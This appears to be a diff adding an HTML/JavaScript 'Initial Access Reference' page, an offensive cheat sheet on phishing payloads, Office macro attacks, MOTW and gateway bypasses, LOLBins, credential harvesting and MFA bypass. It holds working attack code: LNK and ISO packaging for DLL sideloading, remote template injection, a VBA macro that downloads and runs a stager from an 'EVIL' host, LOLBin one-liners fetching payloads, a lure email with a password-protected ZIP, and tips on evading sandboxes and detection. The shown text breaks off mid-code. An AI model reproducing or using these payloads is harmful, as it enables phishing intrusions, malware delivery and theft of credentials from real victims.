@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Initial Access Reference</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}.off{color:#ef4444;font-weight:600;font-size:.82em}.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#60a5fa,#a78bfa,#e879f9);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.hd .sub{font-size:.62em;color:#374151}.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}.sb.on{background:#111318}.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}.ct{padding:10px 14px;overflow-x:auto}.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}.bx-b{padding:6px 10px}.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}.fd .tp{color:#6b7280;font-size:.82em}.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}.tg-s{padding:0 5px;font-size:.68em}.nt{margin:6px 0;padding:7px 10px;border-radius:6px}.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}.ct2:hover{background:#111827}.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}.cv.op{transform:rotate(90deg)}.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}.cb .cm{color:#4b5563}.cb .pp{color:#f59e0b}.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}.ti.op{border-color:#f9731640;background:#f9731608}.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}.ti.op .tn{color:#fdba74}.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}.dt{width:6px;height:6px;border-radius:2px;display:inline-block}.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+var $=function(s){return document.querySelector(s)};
+var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+var SE=[
+{id:"phi",l:"A. Phishing Payloads",i:"\u{1F4E7}",c:"#f87171"},
+{id:"ofc",l:"B. Office Attacks",i:"\u{1F4C4}",c:"#60a5fa"},
+{id:"cnt",l:"C. Containers",i:"\u{1F4E6}",c:"#a78bfa"},
+{id:"smg",l:"D. HTML Smuggling",i:"\u{1F310}",c:"#fbbf24"},
+{id:"lol",l:"E. LOLBins",i:"\u{1F527}",c:"#34d399"},
+{id:"wtr",l:"F. Watering Hole",i:"\u{1F578}\uFE0F",c:"#f59e0b"},
+{id:"crd",l:"G. Credential Harvest",i:"\u{1F511}",c:"#e879f9"},
+{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
+{id:"byp",l:"I. Bypasses",i:"\u{1F6E1}\uFE0F",c:"#fb923c"}
+];
+var S={s:'phi',t:'flow'};
+function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
+function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
+function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
+function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
+function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
+function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
+function fPHI(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">PHISHING PAYLOAD TYPES</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4CE}","Macro-Enabled Documents","#f87171",F("","Word (.docm), Excel (.xlsm), PowerPoint (.pptm)","")+F("","VBA AutoOpen/Document_Open for auto-execution","")+F("","Requires user to click Enable Content","")+F("","MS blocked internet macros by default (2022+)","")+F("","Still works: trusted locations, NTFS streams, old Office",""));
+h+=CRD("\u{1F517}","LNK (Shortcut) Files","#f87171",F("","Target: powershell, cmd, mshta, etc.","")+F("","Icon disguise: PDF, Word, folder icon","")+F("","Argument length: 1024 char limit in explorer","")+F("","Embedded in ZIP or ISO to deliver","")+F("","No macro warning dialog",""));
+h+=CRD("\u{1F310}","HTA (HTML Application)","#f87171",F("","Runs as fully trusted via mshta.exe","")+F("","VBScript or JScript payload inside HTML","")+F("","No sandbox, full system access","")+F("","Delivered via link or attachment","")+F("","SmartScreen checks apply on download",""));
+h+=CRD("\u{1F4DC}","Remote Template Injection","#f87171",F("","Normal .docx references remote .dotm template","")+F("","Template contains VBA macro","")+F("",".docx itself is clean (passes email filter)","")+F("","Macro loaded at runtime from remote URL","")+F("","Edit: word/_rels/settings.xml.rels",""));
+h+=CRD("\u{1F4DD}","OneNote Attachments","#f87171",F("","Embed files (.bat, .vbs, .hta) inside .one file","")+F("","Click button overlay triggers embedded file","")+F("","No macro required","")+F("","MS patched: now blocks dangerous extensions","")+F("","Legacy OneNote versions still vulnerable",""));
+h+=CRD("\u{1F4E5}","QR Code Phishing (Quishing)","#f87171",F("","QR code in email body or PDF","")+F("","Redirects to credential harvest page","")+F("","Bypasses URL scanners (image not link)","")+F("","Target scans with mobile (different security)","")+F("","Increasingly common in M365 attacks",""));
+h+='</div>';return h;
+}
+function fOFC(){
+var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">OFFICE-BASED ATTACKS</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4BB}","VBA Macros","#60a5fa",F("","AutoOpen() / Document_Open() for auto-execute","")+F("","Shell(), WScript.Shell, CreateObject for code execution","")+F("","Download cradle: PowerShell IEX or certutil","")+F("","VBA stomping: remove source, keep p-code only","")+F("","AMSI scans VBA in Office 365+",""));
+h+=CRD("\u{1F4CA}","Excel 4.0 (XLM) Macros","#60a5fa",F("","Legacy macro engine, no VBA","")+F("","EXEC(), CALL() functions for shellcode","")+F("","No AMSI integration (legacy engine)","")+F("","Auto_Open defined name for auto-execution","")+F("","Hidden sheets: xlVeryHidden",""));
+h+=CRD("\u{1F517}","DDE (Dynamic Data Exchange)","#60a5fa",F("","No macros needed, field code based","")+F("","Word: { DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe ... }","")+F("","User prompt: Update links? Yes/No","")+F("","Patched in newer Office (disabled by default)","")+F("","Still works in some legacy environments",""));
+h+=CRD("\u{1F4E6}","Office Add-ins (XLL/VSTO)","#60a5fa",F("","XLL: native DLL loaded by Excel","")+F("","xlAutoOpen export for auto-execution","")+F("","VSTO: .NET Office add-in (.vsto manifest)","")+F("","Runs with Office process privileges","")+F("","MS blocking XLL from internet (2023+)",""));
+h+=CRD("\u{1F527}","ClickOnce / AppRef-ms","#60a5fa",F("",".application files deploy .NET via URL","")+F("","AppRef-ms: shortcut to ClickOnce app","")+F("","Trusted deployment if signed","")+F("","Install location: user profile (no admin)","")+F("","Persistence via Start Menu entry",""));
+h+=CRD("\u{1F4C4}","RTF Template Injection","#60a5fa",F("","RTF with embedded OLE or template link","")+F("","No .docm extension (less suspicious)","")+F("","Equation Editor exploit (CVE-2017-11882) if unpatched","")+F("","Template fetch on open","")+F("","RTF obfuscation with hex encoding",""));
+h+='</div>';return h;
+}
+function fCNT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">CONTAINER / MOTW BYPASS</div>';
+h+='<div class="fr">';
+h+=B("Email/Web","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Payload delivered as attachment/link","")+F("","Downloaded file gets MOTW Zone.Identifier","")+F("","MOTW triggers SmartScreen + Protected View","")+'</div>',200);
+h+=A("contains");
+h+=B("Container","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","ISO/IMG: mounts as drive letter","")+F("","VHD/VHDX: mounts via diskmgmt","")+F("","ZIP: preserves or strips MOTW (version-dependent)","")+F("","7zip: historically did not propagate MOTW","")+F("","Container has MOTW, contents may not","")+'</div>',260);
+h+=A("extracts");
+h+=B("Payload Inside","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","LNK, EXE, DLL, HTA, BAT, VBS inside container","")+F("","No MOTW = no SmartScreen check","")+F("","No Protected View for Office docs","")+F("","Macros run without internet block","")+'</div>',220);
+h+='</div>';
+h+='<div class="grd" style="margin-top:8px">';
+h+=CRD("\u{1F4BF}","ISO / IMG Files","#a78bfa",F("","Double-click mounts as virtual drive (Windows 10+)","")+F("","Contents don't inherit MOTW from container","")+F("","No SmartScreen on files inside mounted ISO","")+F("","Can contain: LNK + hidden DLL/EXE + decoy PDF","")+F("","MS patching: ISO MOTW now propagated in newer builds",""));
+h+=CRD("\u{1F4BE}","VHD / VHDX Files","#a78bfa",F("","Virtual hard disk, mounts as drive","")+F("","Same MOTW bypass as ISO","")+F("","Hyper-V required for auto-mount (Win 10 Pro+)","")+F("","Less commonly filtered by email gateways","")+F("","Larger file size may help bypass size-based scanning",""));
+h+=CRD("\u{1F4E5}","ZIP Variations","#a78bfa",F("","Windows native ZIP: propagates MOTW (newer builds)","")+F("","7zip: did NOT propagate MOTW historically (fixed 23.01+)","")+F("","Password-protected ZIP: gateway can't scan contents","")+F("","Password in email body (separate channel)","")+F("","Double extension: report.pdf.lnk",""));
+h+='</div>';return h;
+}
+function fSMG(){
+var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">HTML SMUGGLING</div>';
+h+='<div class="fr">';
+h+=B("Delivery","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Email with HTML attachment","")+F("","Or: link to hosted HTML page","")+F("","HTML/JS only (no binary to scan)","")+'</div>',200);
+h+=A("opens");
+h+=B("Browser Execution","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","JavaScript decodes embedded data","")+F("","Base64, XOR, AES decryption","")+F("","Constructs binary from decoded bytes","")+F("","Creates Blob URL","")+'</div>',220);
+h+=A("download");
+h+=B("Payload Drop","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","a.click() triggers save dialog or auto-download","")+F("","File: ISO, ZIP, EXE, HTA, MSI","")+F("","Redirect to decoy page after download","")+F("","Proxy sees HTML, not malware","")+'</div>',230);
+h+='</div>';
+h+=N("WHY IT WORKS","#fbbf24","Email gateways scan attachments for malware. HTML smuggling delivers a clean HTML file. The malicious binary is <b>constructed client-side in the browser</b> from encoded data. Network proxies see HTML/JS traffic, not a binary download.");
+return h;
+}
+function fLOL(){
+var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">LOLBIN EXECUTION (Living Off The Land)</div>';
+h+='<div class="grd">';
+var bins=[
+{n:"mshta.exe",d:"Execute HTA files or inline VBScript/JScript. Full trust, no sandbox.",c:"#f87171",u:"mshta http://evil/payload.hta"},
+{n:"msbuild.exe",d:"Inline task: embed C# in .csproj/.xml. No compilation tools needed on target.",c:"#60a5fa",u:"msbuild.exe payload.csproj"},
+{n:"certutil.exe",d:"Download and decode files. Base64, hex decode. Certificate utility LOLBin.",c:"#34d399",u:"certutil -urlcache -split -f http://evil/p.exe p.exe"},
+{n:"regsvr32.exe",d:"Load COM scriptlet (.sct) from URL. Proxy-aware, AppLocker bypass.",c:"#a78bfa",u:"regsvr32 /s /n /u /i:http://evil/sc.sct scrobj.dll"},
+{n:"rundll32.exe",d:"Load DLL and call export function. Or execute JavaScript.",c:"#f59e0b",u:"rundll32 payload.dll,EntryPoint"},
+{n:"wmic.exe",d:"Execute XSL stylesheets with JScript/VBScript. Remote and local.",c:"#e879f9",u:"wmic os get /format:\"http://evil/payload.xsl\""},
+{n:"cmstp.exe",d:"Install connection manager profile. INF file with RunPreSetupCommands.",c:"#fbbf24",u:"cmstp.exe /ni /s payload.inf"},
+{n:"forfiles.exe",d:"Execute commands via /c parameter. Proxy for cmd execution.",c:"#fb923c",u:"forfiles /p c:\\windows /m notepad.exe /c \"cmd /c calc\""},
+{n:"pcalua.exe",d:"Program Compatibility Assistant. Execute arbitrary binary.",c:"#f472b6",u:"pcalua.exe -a payload.exe"},
+{n:"msconfig.exe",d:"Launch binary via Startup tab manipulation. Persistence + execution.",c:"#6b7280",u:"(interactive) Startup tab injection"}
+];
+bins.forEach(function(b){
+h+='<div style="border-radius:6px;border:1px solid '+b.c+'20;background:'+b.c+'06;padding:5px 8px"><div style="font-weight:700;color:'+b.c+';font-size:.74em">'+b.n+'</div><div style="font-size:.66em;color:#9ca3af;margin-top:1px">'+b.d+'</div><div style="font-size:.62em;color:#6b7280;margin-top:2px;font-family:monospace;word-break:break-all">'+b.u+'</div></div>';
+});
+h+='</div>';
+h+=N("LOLBAS PROJECT","#34d399","Full catalog: <b>lolbas-project.github.io</b>. Includes: execution, download, compile, copy, persistence, recon, AV evasion, credential theft. Each binary categorized by capability.");
+return h;
+}
+function fWTR(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">WATERING HOLE / DRIVE-BY / SUPPLY CHAIN</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F578}\uFE0F","Watering Hole","#f59e0b",F("","Compromise a site frequented by target","")+F("","Inject: iframe, JS redirect, exploit kit","")+F("","Selective targeting by IP/user-agent/cookie","")+F("","Victim visits trusted site, gets exploited","")+F("","Requires: web app vuln or compromised CMS",""));
+h+=CRD("\u{1F310}","Drive-By Download","#f59e0b",F("","Browser/plugin exploit on page visit","")+F("","No user interaction beyond visiting URL","")+F("","Exploit kits: automated vuln detection + delivery","")+F("","Declining: browser sandboxing greatly improved","")+F("","Still relevant for unpatched environments",""));
+h+=CRD("\u{1F4E6}","Supply Chain","#f59e0b",F("","Compromise upstream dependency/vendor","")+F("","NPM/PyPI malicious package (typosquatting)","")+F("","Compromised update mechanism","")+F("","SolarWinds-style: signed malicious update","")+F("","Hardest to detect: trusted source, signed code",""));
+h+=CRD("\u{1F517}","Typosquatting","#f59e0b",F("","Register misspelled domain: gooogle.com","")+F("","Package registries: reqeusts instead of requests","")+F("","Credential harvest or malware download","")+F("","Monitor: new registrations similar to target brand","")+F("","dnstwist for generating permutations",""));
+h+=CRD("\u{1F4F1}","USB Drop / Physical","#f59e0b",F("","Rubber Ducky: HID device, types keystrokes","")+F("","BadUSB: reprogrammed USB firmware","")+F("","USB with auto-run payload (legacy)","")+F("","LNK + hidden payload on USB drive","")+F("","Drop in parking lot / mail to target",""));
+h+='</div>';return h;
+}
+function fCRD(){
+var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">CREDENTIAL HARVESTING</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F3A3}","Evilginx2 (Transparent Proxy)","#e879f9",F("","Reverse proxy between victim and real site","")+F("","Captures session cookies post-MFA","")+F("","User sees real O365/Gmail login page","")+F("","Phishlet templates for major services","")+F("","Bypasses MFA completely (token capture)",""));
+h+=CRD("\u{1F4CB}","Cloned Login Pages","#e879f9",F("","GoPhish landing pages: clone target portal","")+F("","POST credentials to capture server","")+F("","Redirect to real site after capture","")+F("","HTTrack or wget -m for site cloning","")+F("","Match SSL, favicon, domain closely",""));
+h+=CRD("\u{1F4F1}","Adversary-in-the-Middle (AitM)","#e879f9",F("","Modlishka: transparent reverse proxy","")+F("","EvilnoVNC: real browser session proxied to victim","")+F("","Captures everything: cookies, tokens, keystrokes","")+F("","VNC-based: no URL mismatch at all","")+F("","Most advanced: victim uses real site via your browser",""));
+h+=CRD("\u{1F511}","Password Spray","#e879f9",F("","Try common passwords against many accounts","")+F("","Avoid lockout: 1 attempt per account per interval","")+F("","Target: OWA, ADFS, VPN portals, Azure AD","")+F("","Common passwords: Season+Year, Company+123","")+F("","Tools: SprayingToolkit, MSOLSpray, TREVORspray",""));
+h+=CRD("\u{1F4E7}","Consent Grant (OAuth Phishing)","#e879f9",F("","Create malicious Azure app registration","")+F("","Phish user to grant app permissions","")+F("","App gets: mail read, file access, etc.","")+F("","No password captured (token-based)","")+F("","Persists: app maintains access until revoked",""));
+h+='</div>';return h;
+}
+function fKIT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">PAYLOAD DELIVERY MATRIX</div>';
+h+='<div class="grd" style="margin-bottom:10px">';
+var matrix=[
+{n:"HTML Smuggling \u2192 ISO \u2192 LNK + DLL",d:"HTML email drops ISO. ISO mounts, LNK sideloads DLL. No macro, no MOTW.",c:"#34d399",r:"\u2B50\u2B50\u2B50\u2B50\u2B50"},
+{n:"Template Injection \u2192 Macro",d:"Clean .docx fetches macro-enabled template at open. Bypasses static email scan.",c:"#60a5fa",r:"\u2B50\u2B50\u2B50\u2B50"},
+{n:"LNK in ZIP (password)",d:"Password ZIP bypasses gateway. LNK executes LOLBin. Password in email body.",c:"#a78bfa",r:"\u2B50\u2B50\u2B50\u2B50"},
+{n:"QR Code \u2192 Evilginx",d:"QR in email/PDF. Scanned on mobile. Evilginx captures session token.",c:"#e879f9",r:"\u2B50\u2B50\u2B50\u2B50"},
+{n:"OneNote + embedded BAT",d:"OneNote file with button overlay hiding .bat. Patched in newer versions.",c:"#f59e0b",r:"\u2B50\u2B50\u2B50"},
+{n:"Direct macro .xlsm",d:"Classic macro doc. Blocked from internet by default since 2022. Legacy only.",c:"#f87171",r:"\u2B50\u2B50"},
+{n:"OAuth consent phishing",d:"No payload. App permission grant gives persistent access. Hard to detect.",c:"#e879f9",r:"\u2B50\u2B50\u2B50\u2B50\u2B50"}
+];
+matrix.forEach(function(m){
+h+='<div style="border-radius:6px;border:1px solid '+m.c+'20;background:'+m.c+'06;padding:5px 8px"><div style="display:flex;justify-content:space-between;align-items:baseline"><span style="font-weight:700;color:'+m.c+';font-size:.72em">'+m.n+'</span><span style="font-size:.6em">'+m.r+'</span></div><div style="font-size:.66em;color:#9ca3af;margin-top:1px">'+m.d+'</div></div>';
+});
+h+='</div>';
+h+=N("DELIVERY TESTING","#f472b6","<b>Before sending:</b> Test email deliverability (mail-tester.com 9+/10). Test payload execution in target-matching VM. Test gateway bypass with benign lookalike. Test SmartScreen with signed similar file. <b>Never test on VirusTotal.</b>");
+return h;
+}
+function fBYP(){
+var h='<div class="grd">';
+h+=CRD("\u{1F6E1}\uFE0F","Mark-of-the-Web (MOTW) Bypass","#fb923c",F("","ISO/IMG/VHD container: contents lack MOTW","")+F("","7zip historically didn't propagate MOTW","")+F("","NTFS alternate data stream manipulation","")+F("","UNC path execution (\\\\server\\share\\payload.exe)","")+F("","Newer Windows patches closing many MOTW gaps",""));
+h+=CRD("\u{1F50D}","SmartScreen Bypass","#fb923c",F("","SmartScreen checks MOTW + file reputation","")+F("","No MOTW = no SmartScreen (container bypass)","")+F("","Signed binary with reputation (code signing cert)","")+F("","Rename to match known-good binary name","")+F("","First-seen binaries: low reputation until scanned",""));
+h+=CRD("\u{1F4E7}","Email Gateway Bypass","#fb923c",F("","Password-protected ZIP (can't scan contents)","")+F("","HTML smuggling (no attachment to scan)","")+F("","Remote template (clean .docx, remote macro)","")+F("","Link instead of attachment (deferred scanning)","")+F("","QR code (image, not URL)",""));
+h+=CRD("\u{1F4DC}","Macro Security Bypass","#fb923c",F("","Trusted locations: %APPDATA%\\Microsoft\\...","")+F("","Mark file as trusted via NTFS stream removal","")+F("","Template injection (macro from remote, not local file)","")+F("","VBA purging / stomping (source removed, p-code runs)","")+F("","Group Policy: macro settings vary by org",""));
+h+=CRD("\u{1F9EA}","Sandbox Evasion (Email)","#fb923c",F("","Delay payload: sleep or timer before execution","")+F("","User interaction required (click, scroll, type)","")+F("","Environment checks: domain-joined, username, RAM","")+F("","Geofencing: check timezone/locale/IP range","")+F("","Multi-stage: benign first stage, malicious second",""));
+h+=CRD("\u{1F510}","MFA Bypass Methods","#fb923c",F("","Evilginx2: capture session token post-MFA","")+F("","EvilnoVNC: proxy real browser session","")+F("","MFA fatigue: push notification spam until approved","")+F("","SIM swap: redirect SMS codes (targeted)","")+F("","OAuth consent: no password or MFA needed",""));
+h+='</div>';return h;
+}
+function getCodes(s){
+var C={};
+C.phi=[
+{t:"LNK payload with DLL sideloading",l:"ps",c:"# Create LNK that executes DLL sideload\n$WshShell = New-Object -ComObject WScript.Shell\n$lnk = $WshShell.CreateShortcut(\"$pwd\\Invoice.lnk\")\n$lnk.TargetPath = \"C:\\Windows\\System32\\cmd.exe\"\n$lnk.Arguments = '/c start \"\" /b rundll32 update.dll,DllMain'\n$lnk.IconLocation = \"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"\n$lnk.WindowStyle = 7  # minimized\n$lnk.Save()\n\n# Package: ISO containing:\n# - Invoice.lnk (visible, Word icon)\n# - update.dll (hidden, your payload DLL)\n# - decoy.pdf (optional, opens real PDF)\n\n# User flow:\n# 1. Double-click ISO -> mounts as drive\n# 2. Sees \"Invoice.lnk\" with Word icon\n# 3. Double-clicks -> runs cmd -> loads DLL\n# 4. No macro warning, no SmartScreen (no MOTW)\n\n# Hide DLL: attrib +h +s update.dll\n# Or use a subfolder the LNK references"},
+{t:"Remote template injection (.docx)",l:"xml",c:"// Modify word/_rels/settings.xml.rels in the .docx ZIP\n// Change Target to point to your malicious .dotm template\n\n// Original:\n// Relationship Type=\"...attachedTemplate\"\n//   Target=\"file:///Normal.dotm\"\n\n// Modified:\n// Relationship Type=\"...attachedTemplate\"\n//   Target=\"http://EVIL/template.dotm\"\n//   TargetMode=\"External\"\n\n// Steps:\n// 1. Create .dotm with VBA macro (payload)\n// 2. Host .dotm on your server\n// 3. Create clean .docx with enticing content\n// 4. Unzip .docx, edit settings.xml.rels\n// 5. Re-zip as .docx\n\n// The .docx is completely clean (no macros)\n// Email gateway scans it: clean\n// On open: Word fetches remote .dotm template\n// Template contains macro -> Enable Content prompt\n\n// python3 approach:\n// from docx import Document\n// ... manipulate relationships programmatically"}
+];
+C.ofc=[
+{t:"VBA download cradle with AMSI bypass",l:"vba",c:"' VBA macro with AMSI consideration\nSub AutoOpen()\n    Dim cmd As String\n    ' Build command string dynamically (evade static scan)\n    Dim p1, p2, p3 As String\n    p1 = \"power\" & \"shell\"\n    p2 = \" -ep bypass -w hidden -c \"\n    p3 = \"IEX(New-Object Net.WebClient).DownloadString('http://EVIL/stager.ps1')\"\n    cmd = p1 & p2 & Chr(34) & p3 & Chr(34)\n    \n    ' Execute via WMI (avoids direct Shell() call)\n    Dim wmi As Object\n    Set wmi = GetObject(\"winmgmts:Win32_Process\")\n    wmi.Create cmd, Null, Null, pid\nEnd Sub\n\n' Alternative: certutil download\n' certutil -urlcache -split -f http://EVIL/p.exe %TEMP%\\p.exe\n' %TEMP%\\p.exe\n\n' VBA stomping:\n' Remove VBA source code, keep compiled p-code\n' p-code still executes, AMSI gets empty source\n' Tool: EvilClippy -s fakecode.vba doc.xlsm"},
+{t:"Excel 4.0 (XLM) macro payload",l:"xlm",c:"// Excel 4.0 macros in hidden macro sheet\n// No VBA, no AMSI integration\n\n// Step 1: Insert Macro 4.0 sheet\n// Right-click sheet tab -> Insert -> MS Excel 4.0 Macro\n\n// Step 2: Define Auto_Open name\n// Formulas -> Name Manager -> New\n// Name: Auto_Open\n// Refers to: =Sheet1!$A$1\n\n// Step 3: Macro formula in A1:\n// A1: =EXEC(\"powershell -ep bypass -c IEX(...)\")\n// A2: =HALT()\n\n// Or for shellcode execution:\n// A1: =REGISTER(\"kernel32\",\"VirtualAlloc\",\"JJJJJ\",\"VA\")\n// A2: =VA(0,SIZE,12288,64)  // MEM_COMMIT|RESERVE, RWX\n// A3: =WRITE.SHELLCODE.TO.MEMORY()  // via CHAR() calls\n// A4: =CALL(addr)  // execute shellcode\n// A5: =HALT()\n\n// Step 4: Hide the sheet\n// Right-click -> Hide\n// Or: VBA to set xlVeryHidden\n\n// Advantages: no AMSI, legacy engine, .xlsm extension"}
+];
+C.cnt=[
+{t:"Create ISO with payload inside",l:"bash",c:"# Linux: create ISO containing LNK + DLL\nmkdir iso_content\n\n# Copy payload files\ncp payload.dll iso_content/update.dll\ncp Invoice.lnk iso_content/\ncp decoy.pdf iso_content/  # optional decoy\n\n# Hide the DLL (set hidden attribute later on Windows)\n# In ISO, this is done post-mount\n\n# Create ISO:\nmkisofs -o payload.iso -J -R iso_content/\n# Or:\ngenisoimage -o payload.iso -J -R iso_content/\n\n# On Windows with PowerShell:\n# $src = \"C:\\staging\\\"\n# $iso = \"C:\\output\\Invoice.iso\"\n# oscdimg -j1 -o -u2 $src $iso\n\n# Test: mount ISO, check that contents lack MOTW\n# Right-click file -> Properties -> no 'Unblock' checkbox\n# = no MOTW = no SmartScreen\n\n# Delivery: attach ISO to email or host for download\n# Many email gateways allow ISO attachments\n# Some block: switch to ZIP containing ISO if needed"},
+{t:"Password-protected ZIP delivery",l:"ps",c:"# Create password-protected ZIP\n# Gateway can't scan contents without password\n# Password shared in email body (different channel)\n\n# PowerShell (7zip required):\n& 'C:\\Program Files\\7-Zip\\7z.exe' a -p'Invoice2025!' payload.zip payload.exe\n\n# Linux:\nzip -P 'Invoice2025!' payload.zip payload.exe\n\n# Email template example:\n# Subject: Invoice #INV-2025-0847\n# Body: Please review the attached invoice.\n#   Password: Invoice2025!\n#   [attachment: payload.zip]\n\n# Inside ZIP options:\n# - LNK file (most effective)\n# - ISO file (double container bypass)\n# - HTA file\n# - Directly: EXE/DLL (risky, may still flag)\n\n# Double extension trick:\n# Name file: Invoice_Q4_2025.pdf.lnk\n# With enough spaces: Invoice_Q4_2025.pdf          .lnk\n# Explorer may truncate, showing only .pdf"}
+];
+C.smg=[
